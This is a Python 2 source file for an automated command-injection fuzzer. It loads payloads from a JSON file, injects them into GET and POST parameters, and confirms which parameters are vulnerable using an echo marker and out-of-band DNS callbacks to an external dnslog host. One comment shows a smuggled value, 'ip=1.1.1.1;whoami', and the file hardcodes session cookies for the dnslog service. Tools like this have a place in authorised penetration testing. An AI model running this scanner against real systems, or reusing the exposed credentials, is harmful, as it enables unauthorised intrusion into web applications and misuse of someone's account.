#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time
import re
import Queue
import json
import os
import string
import random


class FuzzCIF:
    #running = True
    def __init__(self, taskQueue, resultQueue):
        self.taskQueue = taskQueue
        self.resultQueue = resultQueue
        a = os.path.split(os.path.realpath(__file__))[0]
        aj = os.path.join(a, "payload.json")
        with open(aj, "r") as f:
            payload = json.load(f)
        self.fuzzing_payloads_list = payload    # get payload from file
        # 需要添加dnslog的cookie。 dnslog.lijiejie.com 
        self.dnsCookie = "csrftoken=q23gy8gkKN0s0yqT4HjkReqN5Y0b6ER2; sessionid=96up6mnyf4nsi6c1ksdbc7d5lc0qy0gg"
        self.dnsApi = "http://dnslog.lijiejie.com/api/dns/devil/"
        self.webApi = "http://dnslog.lijiejie.com/api/web/devil/"
        self.dnsUrl = "devil.fachun.net"
        
        # dns log headers
        self.dnsHeaders = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
            "Cookie" : self.dnsCookie,
            "Connection" : "close"
            }
        self.running = True
        
        # for now ,only use two payload, one is echo, another is ping, so, the is one key for echo 
        self.echoKey = "" # Maybe huluwa?
    
    def verifyDnsLog(self, item, TAG):
        # verify Normal Command:
        url = item["url"]
        headers = item["request_header"]
        aim = False
        try:
            if item["method"] == "GET":
                resp = requests.get(item["url"], headers=headers, timeout=(5, 15))
                if self.echoKey in resp.content:
                    aim = True
            
            elif item["method"] == "POST":
                resp = requests.post(item["url"], data=item["request_content"], headers=headers, timeout=(5, 15))
                if self.echoKey in resp.content:
                    aim = True
        except Exception as e:
            pass
    
        
    
        # verify DNS, if response is True, then return True, Else, return False
        if self.dnsUrl in item["url"] or self.dnsUrl in item["request_content"]:
            try:
                # sleep(1.5) to make the dnslog accept the log
                time.sleep(1.5)
                resp = requests.get(self.dnsApi + TAG, headers=self.dnsHeaders, timeout=(5, 15))
                if "True" in resp.text:
                    aim = True
            except Exception as e:
                print "[-][ERROR] [DNS Verify] " + str(e)
            
        return aim 
        
    # define Get Process Method
    def Fuzzing_GET(self, item):
        fuzzing_payloads = self.fuzzing_payloads_list
        base_url = item['url']
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", base_url):
            print "[GET] Fuzzing "+match.group("parameter")
            for payload_item in fuzzing_payloads:
                if self.dnsUrl in payload_item:
                    payload_item = payload_item.replace(self.dnsUrl, TAG+"."+self.dnsUrl)
                    payload_item = match.group("value")+payload_item
                # ip=1.1.1.1;whoami
                fuzzing_uri_append = base_url.replace('%s=%s' % (match.group("parameter"), match.group("value")),'%s=%s' % (match.group("parameter"), match.group("value")+payload_item))
                item['url'] = fuzzing_uri_append
                isVuln_a = self.verifyDnsLog(item, TAG)

                # ip=;whoami
                fuzzing_uri_replace = base_url.replace('%s=%s' % (match.group("parameter"), match.group("value")), '%s=%s' % (match.group("parameter"), payload_item))
                item['url'] = fuzzing_uri_replace
                isVuln_r = self.verifyDnsLog(item, TAG)

                # 任意一个测试成功都结束Fuzz
                if isVuln_a or isVuln_r:
                    _ = {"method": "GET", "url" : item["url"], "param" : match.group("parameter"), "payload" : payload_item, "TAG": TAG}
                    self.resultQueue.put(_)
                    #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                    print "[+] Fuzzing Done!!"
                    return
            print "[+] Fuzzing Done!!"
        return        
        
    
    # Fuzzing_POST请求
    def Fuzzing_POST(self, item):
        fuzzing_payloads = self.fuzzing_payloads_list
        base_url = item['url']
        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

        post_body = item['request_content'] #
        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", post_body):
            try:
                print "[POST] Fuzzing "+match.group("parameter")
                for payload_item in fuzzing_payloads:
                    if self.dnsUrl in payload_item:
                        payload_item = payload_item.replace(self.dnsUrl, TAG+"."+self.dnsUrl)
                        payload_item = match.group("value")+payload_item
                    fuzzing_post_body = post_body.replace('%s=%s' % (match.group("parameter"), match.group("value")),'%s=%s' % (match.group("parameter"), payload_item))
                    item['request_content'] = fuzzing_post_body
                    isOver = self.verifyDnsLog(item, TAG)
                    if isOver:
                        _ = {"mthod" : "POST", "url" : item["url"], "param" : match.group("parameter"), "payload" : payload_item, "TAG": TAG}
                        self.resultQueue.put(_)
                        #self.FileHelper("GET", base_url, match.group("parameter"), payload_item, TAG)
                        print "[+] Fuzzing Done!!"
                        return
                print "[failed] Fuzzing Done!!"
            except :
                pass
        return

    #@staticmethod
    def terminate(self):
        self.running = False
        #print "self.running:\t {}".format(self.running)
    
    def task(self):
        while self.running:
            try:
                item = self.taskQueue.get(0.3)
                if item["method"] == "GET":
                    self.Fuzzing_GET(item)
                elif item["method"] == "POST":
                    self.Fuzzing_POST(item)
            except Exception as e:
                print "[-] [ERROR] [Fuzz Run] " + str(e)

                
    def run(self):
        """
        threads = []
        for i in range(5):
            thd = threading.Thread(target=self.task)
            threads.append(thd)
            print "[-] append to []"
        for thd in threads:
            thd.start()
        
        for thd in threads:
            thd.join()
        """
        while self.running:
            try:
                #print "self.running:\t" + str(self.running)
                item = self.taskQueue.get(0.3)
                if item["method"] == "GET":
                    self.Fuzzing_GET(item)
                elif item["method"] == "POST":
                    self.Fuzzing_POST(item)
            except Exception as e:
                print "[-] [ERROR] [Fuzz Run] " + str(e)
        

if __name__ == '__main__':
    """
    with open("payload.json", "r") as f:
        lines = json.load(f)
    print len(lines)
    for i in lines:
        print i

    """
    print os.path.split(os.path.realpath(__file__))[0]







